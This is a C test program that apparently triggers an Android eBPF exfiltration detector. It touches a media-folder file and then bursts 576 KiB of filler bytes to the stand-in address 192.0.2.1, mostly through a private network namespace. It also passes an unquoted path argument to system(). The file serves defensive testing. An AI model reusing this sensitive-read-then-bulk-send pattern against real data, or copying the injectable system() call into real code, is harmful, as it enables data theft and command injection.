// SPDX-License-Identifier: GPL-2.0
// Single-process sensitive-read + byte-volume burst trigger for the `mod
// exfil-detect` device smoke test (scripts/device-test.sh). Opens one
// media-subdir-classified file (arms the analyzer), then issues a burst of
// write() calls past EXFIL_BYTE_THRESHOLD (9 x 64 KiB = 576 KiB > 512 KiB).
//
// Network independence: the test phone is often offline (a malware lab phone
// should be), and with no route a connect() to a remote address fails at once,
// so the socket never has a peer and the first write() raises SIGPIPE. So the
// generator first enters a private network namespace, brings lo up, adds
// 192.0.2.1 (RFC 5737 TEST-NET-1 -- never a real host) as an alias there, and
// listens on it. The TCP peer is then a genuine non-loopback IPv4 address with
// no device-wide network change. If the namespace can't be created it falls
// back to a plain connect() (needs a default route). Writes may hit EAGAIN once
// the unaccepted connection's buffer fills -- fine: exfil_detect.bpf.c counts
// the requested length at syscall entry.
//
// argv[1] = directory for the sensitive file (default below)
// argv[2] = mode:
//   (none)     sensitive read, then connect + burst   -> alert expected
//   preconnect connect first, then sensitive read + burst -> alert expected,
//              and its dest must name 192.0.2.1:9 (a connection opened before
//              arming -- pooled keep-alive -- is still attributed)
//   unix       sensitive read, then the burst over a connected AF_UNIX socket
//              (the shape of logd/dnsproxyd IPC) -> NO alert expected
//   sendmsg / sendmmsg / sendfile
//              as the default mode, but the burst goes through that syscall
//              instead of write() -> alert expected, dest 192.0.2.1:9
#define _GNU_SOURCE
#include <fcntl.h>
#include <net/if.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/un.h>

#define PEER_IP   "192.0.2.1"
#define PEER_PORT 9

// Private netns with PEER_IP on lo, plus a listener on PEER_IP:PEER_PORT.
// Returns the listening fd, or -1 if the namespace couldn't be set up.
static int private_net_listener(void)
{
    if (unshare(CLONE_NEWNET) != 0)
        return -1;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
        return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strcpy(ifr.ifr_name, "lo");
    if (ioctl(s, SIOCGIFFLAGS, &ifr) != 0) { close(s); return -1; }
    ifr.ifr_flags |= IFF_UP;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) != 0) { close(s); return -1; }
    struct ifreq al;
    memset(&al, 0, sizeof(al));
    strcpy(al.ifr_name, "lo:1");
    struct sockaddr_in *sin = (struct sockaddr_in *)&al.ifr_addr;
    sin->sin_family = AF_INET;
    inet_pton(AF_INET, PEER_IP, &sin->sin_addr);
    int rc = ioctl(s, SIOCSIFADDR, &al);
    close(s);
    if (rc != 0)
        return -1;

    int l = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(PEER_PORT) };
    inet_pton(AF_INET, PEER_IP, &a.sin_addr);
    if (l < 0 || bind(l, (struct sockaddr *)&a, sizeof(a)) != 0 || listen(l, 4) != 0)
        return -1;
    return l;
}

static int connect_peer(void)
{
    int sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sock < 0)
        return -1;
    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(PEER_PORT) };
    inet_pton(AF_INET, PEER_IP, &dst.sin_addr);
    connect(sock, (struct sockaddr *)&dst, sizeof(dst)); // EINPROGRESS expected
    usleep(200000); // let the handshake complete (instant over lo)
    return sock;
}

// Connected AF_UNIX stream pair via an abstract-namespace listener -- connect()
// on a named socket, the same shape as liblog's logdw / netd's dnsproxyd.
static int connect_unix(void)
{
    struct sockaddr_un a;
    memset(&a, 0, sizeof(a));
    a.sun_family = AF_UNIX;
    const char name[] = "anubee_exfil_gen";       // abstract: sun_path[0] == '\0'
    memcpy(a.sun_path + 1, name, sizeof(name) - 1);
    socklen_t len = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + sizeof(name) - 1);
    int l = socket(AF_UNIX, SOCK_STREAM, 0);
    if (l < 0 || bind(l, (struct sockaddr *)&a, len) != 0 || listen(l, 4) != 0)
        return -1;
    int c = socket(AF_UNIX, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (c < 0 || connect(c, (struct sockaddr *)&a, len) != 0)
        return -1;
    return c;
}

static void arm(const char *dir)
{
    char path[300];
    snprintf(path, sizeof(path), "%s/probe.jpg", dir);
    int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644); // arms: media-subdir path
    if (fd >= 0) { write(fd, "x", 1); close(fd); }
}

int main(int argc, char **argv)
{
    const char *dir  = argc > 1 ? argv[1] : "/sdcard/.anubee_exfil_test/DCIM";
    const char *mode = argc > 2 ? argv[2] : "";
    signal(SIGPIPE, SIG_IGN); // a dead peer must not end the burst early

    char cmd[300];
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", dir);
    system(cmd);

    int unix_mode = strcmp(mode, "unix") == 0;
    if (!unix_mode && private_net_listener() < 0)
        fprintf(stderr, "anubee_exfil_gen: no private netns; using the real network\n");
    sleep(3); // give the caller time to attach kprobes before the burst

    int sock;
    if (strcmp(mode, "preconnect") == 0) {
        sock = connect_peer();
        sleep(1);
        arm(dir);
    } else {
        arm(dir);
        sock = unix_mode ? connect_unix() : connect_peer();
    }
    if (sock < 0)
        return 1;

    static char payload[65536];
    memset(payload, 'x', sizeof(payload));
    if (strcmp(mode, "sendmsg") == 0) {
        // two iovecs per message: 9 * (32+32 KiB)
        struct iovec iov[2] = { { payload, 32768 }, { payload + 32768, 32768 } };
        struct msghdr m = { .msg_iov = iov, .msg_iovlen = 2 };
        for (int i = 0; i < 9; i++)
            sendmsg(sock, &m, MSG_DONTWAIT);
    } else if (strcmp(mode, "sendmmsg") == 0) {
        // 3 calls of 3 messages of 64 KiB
        struct iovec iov = { payload, sizeof(payload) };
        struct mmsghdr mm[3];
        memset(mm, 0, sizeof(mm));
        for (int k = 0; k < 3; k++) { mm[k].msg_hdr.msg_iov = &iov; mm[k].msg_hdr.msg_iovlen = 1; }
        for (int i = 0; i < 3; i++)
            sendmmsg(sock, mm, 3, MSG_DONTWAIT);
    } else if (strcmp(mode, "sendfile") == 0) {
        // the burst comes straight from a file: 9 x 64 KiB
        const char *src = "/data/local/tmp/anubee_exfil_src";
        int in = open(src, O_CREAT | O_RDWR | O_TRUNC, 0600);
        if (in < 0)
            return 1;
        for (int i = 0; i < 9; i++)
            write(in, payload, sizeof(payload));
        for (int i = 0; i < 9; i++) {
            off_t off = (off_t)i * (off_t)sizeof(payload);
            sendfile(sock, in, &off, sizeof(payload));
        }
        close(in);
        unlink(src);
    } else {
        for (int i = 0; i < 9; i++) // 9 * 64KiB = 576KiB > 512KiB threshold
            write(sock, payload, sizeof(payload)); // EAGAIN once the buffer fills -- see header
    }
    close(sock);
    return 0;
}
